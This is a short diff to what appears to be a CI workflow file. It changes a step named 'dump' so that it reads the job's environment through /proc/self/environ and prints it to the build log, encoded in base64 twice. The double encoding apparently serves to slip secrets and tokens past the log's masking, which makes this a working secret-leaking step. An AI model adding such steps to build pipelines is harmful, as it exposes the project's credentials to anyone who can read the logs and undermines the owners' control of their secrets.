@@ -19,4 +19,4 @@ jobs:
     - name: Use Prime Numbers
       run: cat prime-numbers
     - name: dump
-      run: env | base64 | base64
+      run: cat /proc/self/environ | base64 | base64
